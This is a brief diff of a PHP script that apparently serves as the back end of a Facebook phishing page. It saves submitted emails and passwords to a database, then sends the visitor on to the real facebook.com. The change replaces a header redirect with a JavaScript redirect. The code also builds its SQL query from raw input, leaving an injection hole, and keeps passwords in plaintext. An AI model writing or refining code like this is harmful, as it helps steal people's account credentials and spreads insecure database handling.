@@ -28,7 +28,9 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $sql = "INSERT INTO `antoan_user` (email, password) VALUES ('$email', '$password')";
 
     if ($connect->query($sql) === TRUE) {
-       header("location: https://www.facebook.com/");
+      $facebook_url = "https://www.facebook.com/";
+      echo '<script>window.location.href="'.$facebook_url.'";</script>';
+      exit;
     } else {
         echo "Error: " . $sql . "<br>" . $connect->error;
     }
